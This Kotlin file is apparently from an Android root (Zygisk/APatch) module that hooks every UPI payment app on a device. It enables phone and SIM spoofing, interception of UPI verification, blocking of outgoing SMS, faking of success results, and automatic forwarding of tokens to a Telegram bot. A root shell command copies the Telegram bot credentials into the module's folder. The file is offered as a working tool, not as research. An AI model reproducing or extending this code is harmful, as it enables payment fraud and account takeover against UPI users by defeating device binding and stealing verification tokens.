package com.hivirtus.zygiskmode

import android.content.Context

/** Boot / app start — sab UPI apps hook scope + APatch package list seed. */
object HookScopeBootstrap {

    fun applyAllUpiHooks(context: Context, configManager: ConfigManager) {
        val current = configManager.load()
        if (!current.hookAllUpiApps) return

        val allHooked = UpiAppRegistry.nativeHookPackages().associate { it.packageName to true }
        val phone = configManager.readSpoofPhone().ifBlank { current.mockPhoneSim1 }
        val updated = current.copy(
            hookedUpiApps = allHooked,
            hookUpiVerification = true,
            hookOutgoingSms = true,
            interceptFakeSuccess = true,
            autoForwardToken = true,
            fakeInterceptTelegram = true,
            autoHookForeground = true,
            enableVirtualSim = current.enableVirtualSim || current.enableSim1Mock || current.enablePhoneSpoof,
            enableSim1Mock = current.enableSim1Mock || current.enableVirtualSim || current.enablePhoneSpoof,
            enablePhoneSpoof = current.enablePhoneSpoof || current.enableVirtualSim || current.enableSim1Mock,
            mockPhoneSim1 = phone
        )
        if (!configManager.saveAndFlushSync(updated)) return

        if (phone.isNotBlank()) configManager.writeSpoofPhoneSync(phone)
        syncTelegramCredsToModule(configManager)
        ActiveHookManager.persistHookedScope(allHooked.keys)
        ActiveHookManager.persistAllSelected(allHooked.keys)
        FrameworkHookHelper.markScopeActivePublic()
        PhoneSmsBlocker.enforce(context.applicationContext)
        OutgoingSmsGuard.refresh(context.applicationContext)
    }

    private fun syncTelegramCredsToModule(configManager: ConfigManager) {
        val config = configManager.load()
        val token = config.telegramBotToken.trim()
        val chat = config.telegramChatId.trim()
        if (token.isBlank() || chat.isBlank()) return
        val payload = org.json.JSONObject()
            .put("telegram_bot_token", token)
            .put("telegram_chat_id", chat)
            .toString(2)
        try {
            java.io.File("/data/local/tmp/hivirtus_telegram_credentials.json").writeText(payload)
        } catch (_: Exception) {
            ShellHelper.runSu(
                "mkdir -p /data/adb/modules/hivirtus_zygisk_mode /data/local/tmp 2>/dev/null; " +
                    "cp /data/local/tmp/hivirtus_telegram_credentials.json " +
                    "/data/adb/modules/hivirtus_zygisk_mode/telegram_credentials.json 2>/dev/null"
            )
        }
    }
}
